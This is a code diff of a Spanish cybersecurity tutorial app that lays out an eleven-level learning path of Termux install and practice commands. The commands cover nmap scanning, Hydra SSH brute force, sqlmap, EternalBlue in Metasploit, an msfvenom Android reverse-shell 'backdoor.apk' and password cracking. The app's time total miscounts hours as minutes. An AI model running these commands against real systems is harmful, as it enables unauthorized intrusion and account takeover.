@@ -554,86 +554,211 @@ const DATA = {
 
   learning: [
     {
-      level: 0, title: 'Fundamentos', subtitle: 'Los pilares de la ciberseguridad',
-      icon: '📚', topics: [
-        'Comprender el modelo OSI y TCP/IP',
-        'Conceptos básicos de redes (IP, puertos, protocolos)',
-        'Comandos esenciales de Linux (navegación, permisos, procesos)',
-        'Entender HTTP/HTTPS: métodos, cabeceras, cookies',
-        'Conceptos de DNS: cómo funciona, tipos de registros',
-        'Introducción a la terminal y scripting básico',
-        'Cifrado simétrico vs asimétrico',
-        'Ética y legalidad en ciberseguridad'
+      level: 0, title: 'Setup Inicial — Tus primeros pasos', subtitle: 'Preparar el terreno',
+      icon: '🚀', time: '15 min',
+      install: ['pkg update && pkg upgrade -y', 'pkg install curl wget git python nmap'],
+      practice: [
+        { label: 'Probar que Termux funciona', cmd: 'echo "Hola desde Termux!" && whoami' },
+        { label: 'Ver tu IP pública', cmd: 'curl -s ifconfig.me' },
+        { label: 'Hacer ping a un sitio', cmd: 'ping -c 4 google.com' },
+        { label: 'Traceroute básico', cmd: 'traceroute google.com' },
+        { label: 'Escanea tu red local', cmd: 'nmap -sn 192.168.1.0/24' }
+      ],
+      learn: [
+        'Qué es Termux y cómo funciona',
+        'Comandos básicos de Linux: ls, cd, pwd, cat, nano',
+        'Qué es una IP, un puerto, un protocolo',
+        'Diferencia entre HTTP y HTTPS',
+        'Qué es DNS y cómo resuelve nombres',
+        'Ética: nunca escanear sin permiso'
       ]
     },
     {
-      level: 1, title: 'Reconocimiento OSINT', subtitle: 'Recolectar información sin tocar el objetivo',
-      icon: '🔍', topics: [
-        'Nmap: Escaneo de puertos y detección de servicios',
-        'theHarvester: Recolección de correos y subdominios',
-        'Sherlock: Buscar usuarios en redes sociales',
-        'Shodan: Buscador de dispositivos IoT',
-        'Amass / Sublist3r: Enumeración de subdominios',
-        'Wappalyzer / WhatWeb: Identificar tecnologías web',
-        'Google Dorks: Búsquedas avanzadas en Google',
-        'Nikto: Escaneo básico de servidores web',
-        'Certificado SSL: Buscar en crt.sh'
+      level: 1, title: 'Escaneo de Redes con Nmap', subtitle: 'Descubrir qué hay en la red',
+      icon: '🌐', time: '30 min',
+      install: ['pkg install nmap'],
+      practice: [
+        { label: 'Escaneo básico de puertos', cmd: 'nmap -sV scanme.nmap.org' },
+        { label: 'Escaneo de red local', cmd: 'nmap -sn 192.168.1.0/24' },
+        { label: 'Detectar sistema operativo', cmd: 'nmap -O 192.168.1.1' },
+        { label: 'Escaneo de todos los puertos', cmd: 'nmap -p- 192.168.1.1' },
+        { label: 'Escaneo sigiloso', cmd: 'nmap -sS -T4 scanme.nmap.org' },
+        { label: 'Guardar resultados', cmd: 'nmap -oN resultados.txt scanme.nmap.org' }
+      ],
+      learn: [
+        'Diferencia entre TCP y UDP',
+        'Puertos comunes: 22(SSH), 80(HTTP), 443(HTTPS), 21(FTP)',
+        'Estados de puertos: open, closed, filtered',
+        'Qué es un banner y para qué sirve',
+        'Escaneo sigiloso vs escaneo completo'
       ]
     },
     {
-      level: 2, title: 'Escaneo y Enumeración Web', subtitle: 'Mapear la superficie de ataque',
-      icon: '🛡️', topics: [
-        'OWASP ZAP: Proxy y escáner automatizado',
-        'Burp Suite: Interceptar y modificar peticiones',
-        'Dirb / Gobuster: Descubrir directorios ocultos',
-        'WPScan: Auditoría de WordPress',
-        'Nuclei: Escaneo con templates de vulnerabilidades',
-        'Identificar parámetros y endpoints',
-        'Enumerar usuarios y versiones',
-        'Revisar archivos robots.txt y sitemap.xml',
-        'Fingerprinting de servidores web'
+      level: 2, title: 'Enumeración Web — Directorios y Servidores', subtitle: 'Descubrir rutas y tecnologías ocultas',
+      icon: '🔍', time: '45 min',
+      install: ['pkg install gobuster', 'pkg install nikto'],
+      practice: [
+        { label: 'Descubrir directorios con Gobuster', cmd: 'gobuster dir -u https://ejemplo.com -w /usr/share/wordlists/dirb/common.txt' },
+        { label: 'Descubrir subdominios', cmd: 'gobuster dns -d ejemplo.com -w /usr/share/wordlists/dirb/common.txt' },
+        { label: 'Escaneo rápido con Nikto', cmd: 'nikto -h https://ejemplo.com' },
+        { label: 'What web technologies?', cmd: 'curl -s -I https://ejemplo.com | grep -i server' },
+        { label: 'Revisar robots.txt', cmd: 'curl https://ejemplo.com/robots.txt' }
+      ],
+      learn: [
+        'Qué son los directorios ocultos y por qué existen',
+        'Qué revela un servidor web en sus cabeceras HTTP',
+        'Cómo funciona robots.txt y sitemap.xml',
+        'Identificar tecnologías por cabeceras y cookies',
+        'Qué es el fingerprinting de servidores'
       ]
     },
     {
-      level: 3, title: 'Explotación Básica', subtitle: 'Identificar y explotar vulnerabilidades comunes',
-      icon: '💥', topics: [
-        'SQL Injection Manual y con SQLMap',
-        'Cross-Site Scripting (XSS): Reflejado, Almacenado, DOM',
-        'Local/Remote File Inclusion (LFI/RFI)',
-        'Cross-Site Request Forgery (CSRF)',
-        'Fuerza bruta con Hydra en servicios',
-        'Subida de archivos maliciosos',
-        'Command Injection',
-        'Server-Side Request Forgery (SSRF)',
-        'Uso de Searchsploit para encontrar exploits'
+      level: 3, title: 'OSINT — Investigación sin dejar rastro', subtitle: 'Recolectar información pública',
+      icon: '🕵️', time: '40 min',
+      install: ['pip install sherlock-project', 'pip install theHarvester', 'pip install shodan'],
+      practice: [
+        { label: 'Buscar usuario en redes', cmd: 'sherlock tu_usuario_de_prueba' },
+        { label: 'Recolectar correos', cmd: 'theHarvester -d ejemplo.com -b google' },
+        { label: 'Buscar subdominios', cmd: 'theHarvester -d ejemplo.com -b bing' },
+        { label: 'Google Dorks básico', cmd: 'Busca en Google: site:ejemplo.com filetype:pdf' },
+        { label: 'Ver certificados SSL', cmd: 'curl -s https://crt.sh/?q=ejemplo.com | grep -o "\'[a-z0-9.-]*\.ejemplo.com\'"' }
+      ],
+      learn: [
+        'Qué es OSINT y cómo se usa legalmente',
+        'Google Dorks: operadores site:, filetype:, intitle:',
+        'Shodan: el buscador de dispositivos',
+        'crt.sh: registros de certificados SSL',
+        'Cómo la información pública puede ser recolectada'
       ]
     },
     {
-      level: 4, title: 'Explotación Avanzada', subtitle: 'Metasploit, post-explotación y movimientos laterales',
-      icon: '🧬', topics: [
-        'Metasploit Framework: Módulos y payloads',
-        'Creación de payloads con MSFVenom',
-        'Reverse shells y bind shells',
-        'Escalada de privilegios en Linux (SUID, cron, kernel)',
-        'Escalada de privilegios en Windows (Token, UAC bypass)',
-        'Movimiento lateral en la red',
-        'Pivoting y tunneling',
-        'Persistencia en sistemas comprometidos',
-        'BeEF: Explotación del navegador'
+      level: 4, title: 'Escaneo de Vulnerabilidades', subtitle: 'Detectar fallos de seguridad',
+      icon: '🛡️', time: '1 hora',
+      install: ['pkg install nuclei', 'pkg install wpscan'],
+      practice: [
+        { label: 'Escaneo rápido con Nuclei', cmd: 'nuclei -u https://ejemplo.com' },
+        { label: 'Nuclei con templates de tecnología', cmd: 'nuclei -u https://ejemplo.com -tags tech' },
+        { label: 'WPScan en WordPress', cmd: 'wpscan --url https://ejemplo-wp.com' },
+        { label: 'WPScan enumerar usuarios', cmd: 'wpscan --url https://ejemplo-wp.com --enumerate u' },
+        { label: 'Resultados en JSON', cmd: 'nuclei -u https://ejemplo.com -json -o resultados.json' }
+      ],
+      learn: [
+        'Qué es una vulnerabilidad y cómo se clasifica (CVE, CVSS)',
+        'Diferencia entre escaneo automatizado y manual',
+        'Qué es WPScan y qué detecta en WordPress',
+        'Nuclei: escaneo con templates comunitarios',
+        'Interpretar resultados de un escáner'
       ]
     },
     {
-      level: 5, title: 'Especialización', subtitle: 'Ramas avanzadas de la ciberseguridad',
-      icon: '🎯', topics: [
-        'Seguridad Móvil: OWASP MASVS, MobSF, APKTool, JADX',
-        'Reverse Engineering de APKs',
-        'Cloud Security: AWS, Azure, GCP hardening',
-        'Blockchain y Smart Contract auditing',
-        'Forense Digital: Autopsy, Volatility, Foremost',
-        'Ingeniería Social: SET, Gophish',
-        'Active Directory: Kerberos, ACLs, BloodHound',
-        'Web3 Security: Flash loans, rug pulls, smart contract vulns',
-        'Bug Bounty: Cómo empezar, plataformas, reporting'
+      level: 5, title: 'SQL Injection y Ataques Web', subtitle: 'Explotar vulnerabilidades web comunes',
+      icon: '💥', time: '1.5 horas',
+      install: ['pip install sqlmap', 'pkg install hydra'],
+      practice: [
+        { label: 'Detectar SQLi con SQLMap', cmd: 'sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"' },
+        { label: 'Listar bases de datos', cmd: 'sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs' },
+        { label: 'Fuerza bruta SSH con Hydra', cmd: 'hydra -l root -P passwords.txt ssh://192.168.1.1' },
+        { label: 'Buscar exploit con SearchSploit', cmd: 'searchsploit wordpress' },
+        { label: 'Buscar por CVE específico', cmd: 'searchsploit cve-2021-41773' }
+      ],
+      learn: [
+        'Qué es SQL Injection y cómo funciona',
+        'Tipos de SQLi: in-band, blind, out-of-band',
+        'Qué es fuerza bruta y cómo protegerte',
+        'Qué son los exploits y cómo encontrarlos',
+        'Laboratorios gratis para practicar: tryhackme.com, portswigger.net/web-security'
+      ]
+    },
+    {
+      level: 6, title: 'Explotación con Metasploit', subtitle: 'El framework de explotación más poderoso',
+      icon: '🧬', time: '1.5 horas',
+      install: ['pkg install metasploit'],
+      practice: [
+        { label: 'Iniciar Metasploit', cmd: 'msfconsole' },
+        { label: 'Buscar exploits disponibles', cmd: 'dentro de msfconsole: search eternalblue' },
+        { label: 'Usar un exploit', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
+        { label: 'Ver opciones del módulo', cmd: 'show options' },
+        { label: 'Generar payload con MSFVenom', cmd: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=tu_ip LPORT=4444 -o backdoor.apk' }
+      ],
+      learn: [
+        'Qué es Metasploit y cómo funciona',
+        'Diferencia entre exploit, payload y auxiliary',
+        'Qué es Meterpreter y para qué sirve',
+        'Generación de payloads para Android',
+        'Siempre en entornos autorizados'
+      ]
+    },
+    {
+      level: 7, title: 'Seguridad Móvil — Analiza APKs', subtitle: 'Auditar apps de Android',
+      icon: '📱', time: '1 hora',
+      install: ['pkg install apktool', 'pkg install jadx'],
+      practice: [
+        { label: 'Decompilar un APK', cmd: 'apktool d app.apk' },
+        { label: 'Ver el AndroidManifest', cmd: 'cat app/AndroidManifest.xml' },
+        { label: 'Buscar permisos peligrosos', cmd: 'grep -r "android.permission" app/ | grep -i "camera\\|location\\|sms"' },
+        { label: 'Descompilar a Java con JADX', cmd: 'jadx -d output/ app.apk' },
+        { label: 'Buscar APIs sensibles', cmd: 'grep -r "getDeviceId\\|getInstalledPackages" output/' }
+      ],
+      learn: [
+        'Estructura de un APK (AndroidManifest, classes.dex, resources)',
+        'Permisos peligrosos en Android',
+        'Cómo decompilar y analizar código smali/Java',
+        'OWASP MASVS: el estándar de seguridad móvil',
+        'Qué buscar en una auditoría de APK'
+      ]
+    },
+    {
+      level: 8, title: 'Privacidad y Anonimato', subtitle: 'Navegar sin dejar rastro',
+      icon: '🧅', time: '30 min',
+      install: ['pkg install tor', 'pkg install proxychains-ng'],
+      practice: [
+        { label: 'Iniciar Tor', cmd: 'tor' },
+        { label: 'Verificar IP con Tor', cmd: 'curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip' },
+        { label: 'Nmap anónimo con proxychains', cmd: 'proxychains nmap -sT scanme.nmap.org' },
+        { label: 'Navegar desde terminal', cmd: 'proxychains curl https://duckduckgo.com' }
+      ],
+      learn: [
+        'Cómo funciona la red Tor (onion routing)',
+        'Diferencia entre VPN, Tor y proxychains',
+        'Qué es el anonimato y qué NO garantiza',
+        'Buenas prácticas de privacidad digital',
+        'Riesgos de usar estas herramientas ilegalmente'
+      ]
+    },
+    {
+      level: 9, title: 'Password Cracking (Ético)', subtitle: 'Entender la seguridad de contraseñas',
+      icon: '🔓', time: '1 hora',
+      install: ['pkg install john', 'pkg install hashcat', 'pkg install hydra'],
+      practice: [
+        { label: 'Identificar tipo de hash', cmd: 'echo "5d41402abc4b2a76b9719d911017c592" | hashid' },
+        { label: 'Crackear MD5 con John', cmd: 'echo "admin:5d41402abc4b2a76b9719d911017c592" > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
+        { label: 'Crackear con reglas', cmd: 'john --wordlist=wordlist.txt --rules hash.txt' },
+        { label: 'Ver resultados', cmd: 'john --show hash.txt' }
+      ],
+      learn: [
+        'Tipos de hash: MD5, SHA1, SHA256, bcrypt',
+        'Qué es un ataque de diccionario vs fuerza bruta',
+        'Cómo funcionan las rainbow tables',
+        'Importancia de contraseñas fuertes',
+        'Solo con tus propios hashes o con autorización'
+      ]
+    },
+    {
+      level: 10, title: 'Bug Bounty — El Siguiente Nivel', subtitle: 'Gana dinero encontrando bugs',
+      icon: '🏆', time: 'Lectura',
+      install: ['Lee los recursos recomendados'],
+      practice: [
+        { label: 'Plataforma #1', cmd: 'Crear cuenta en hackerone.com' },
+        { label: 'Plataforma #2', cmd: 'Crear cuenta en bugcrowd.com' },
+        { label: 'Laboratorios gratis', cmd: 'PortSwigger Web Security Academy' },
+        { label: 'CTF para practicar', cmd: 'tryhackme.com y hackthebox.com' }
+      ],
+      learn: [
+        'Qué es Bug Bounty y cómo funciona',
+        'Plataformas: HackerOne, Bugcrowd, Intigriti',
+        'Cómo escribir un buen reporte de vulnerabilidad',
+        'Programas públicos vs privados',
+        'Habilidades necesarias para empezar'
       ]
     }
   ],
@@ -968,14 +1093,27 @@ const App = {
         </div>
       </div>
 
-      <div class="card">
-        <div class="card-title">🎯 ¿Qué es NINJApp?</div>
+      <div class="card" style="border-color:rgba(168,85,247,0.3);">
+        <div class="card-title" style="color:var(--accent-purple);">🗺️ Tu ruta de aprendizaje</div>
         <div class="card-desc">
-          Plataforma educativa de ciberseguridad para móvil. Aprende sobre herramientas de hacking ético,
-          escaneo de vulnerabilidades, OSINT, seguridad móvil y más. Todo el contenido es
-          educativo y promueve el uso ético y legal.
+          Sigue los niveles en orden. Cada uno tiene:<br>
+          📥 Comandos para instalar lo necesario<br>
+          🎯 Ejercicios prácticos para probar<br>
+          📖 Conceptos que aprenderás<br><br>
+          <span style="color:var(--text-muted);font-size:11px;">${DATA.learning.length} niveles · ~${DATA.learning.reduce((a,l)=>a+parseInt(l.time),0)} min total</span>
         </div>
-        <div class="card-tag tag-green">Siempre con autorización</div>
+        <div style="display:flex;flex-direction:column;gap:3px;margin-top:10px;">
+          ${DATA.learning.map((l,i) => `
+            <div style="display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:${i<DATA.learning.length-1?'1px solid var(--border-color)':'none'};">
+              <span style="font-size:14px;">${l.icon}</span>
+              <div style="flex:1;font-size:11px;color:var(--text-secondary);">
+                <span style="color:var(--text-primary);font-weight:bold;">${l.title}</span>
+                <span style="color:var(--text-muted);"> · ${l.time}</span>
+              </div>
+              <button class="card-tag tag-green" style="cursor:pointer;border:none;font-size:9px;" onclick="App.switchSection('learn')">Ir →</button>
+            </div>
+          `).join('')}
+        </div>
       </div>
 
       <div style="margin-top:4px;">
@@ -1096,22 +1234,40 @@ const App = {
 
   renderLearning() {
     const container = document.getElementById('learn-content');
-    const labels = ['🟢 Básico', '🔵 Principiante', '🟡 Intermedio', '🟠 Avanzado', '🔴 Experto', '🟣 Especialista'];
+    const emojis = ['🚀','🌐','🔍','🕵️','🛡️','💥','🧬','📱','🧅','🔓','🏆'];
 
     container.innerHTML = DATA.learning.map(l => `
       <div class="level-card level${l.level}">
         <div class="level-header">
           <div>
             <div class="level-title">${l.icon} ${l.title}</div>
-            <div class="level-subtitle">${l.subtitle}</div>
+            <div class="level-subtitle">${l.subtitle} · ⏱ ${l.time}</div>
           </div>
           <div style="display:flex;align-items:center;gap:8px;">
-            <span style="font-size:10px;font-family:var(--font-mono);color:var(--text-muted);">${labels[l.level]}</span>
+            <span style="font-size:10px;font-family:var(--font-mono);color:var(--text-muted);">${emojis[l.level]} Nivel ${l.level}</span>
             <span class="level-arrow">▼</span>
           </div>
         </div>
         <div class="level-topics">
-          <div style="margin-top:10px;">${l.topics.map(t => `<div class="topic-item"><span class="topic-check">○</span><span>${t}</span></div>`).join('')}</div>
+          <div style="margin-top:10px;">
+            <div class="modal-section-title" style="color:var(--accent-green);">📥 Instalar</div>
+            <div style="margin-bottom:10px;">
+              ${l.install.map(c => `<div class="modal-command" style="cursor:pointer;margin-bottom:4px;" onclick="if(navigator.clipboard){navigator.clipboard.writeText('${c.replace(/'/g,"\\'")}').then(()=>{this.innerHTML='✓ Copiado!';setTimeout(()=>this.innerHTML='${c.replace(/'/g,"\\'")}',1200)});}">${c}</div>`).join('')}
+            </div>
+
+            <div class="modal-section-title" style="color:var(--accent-cyan);">🎯 Practica</div>
+            <div style="margin-bottom:10px;">
+              ${l.practice.map(p => `
+                <div style="margin-bottom:6px;padding:6px 8px;background:rgba(0,0,0,0.2);border-radius:4px;">
+                  <div style="font-size:11px;color:var(--text-secondary);margin-bottom:3px;">${p.label}</div>
+                  <div class="modal-command" style="cursor:pointer;font-size:10px;margin:0;" onclick="if(navigator.clipboard){navigator.clipboard.writeText('${p.cmd.replace(/'/g,"\\'")}').then(()=>{this.innerHTML='✓ Copiado!';setTimeout(()=>this.innerHTML='${p.cmd.replace(/'/g,"\\'")}',1200)});}">${p.cmd}</div>
+                </div>
+              `).join('')}
+            </div>
+
+            <div class="modal-section-title" style="color:var(--accent-yellow);">📖 Aprenderás</div>
+            ${l.learn.map(t => `<div class="topic-item"><span class="topic-check">○</span><span>${t}</span></div>`).join('')}
+          </div>
         </div>
       </div>
     `).join('');
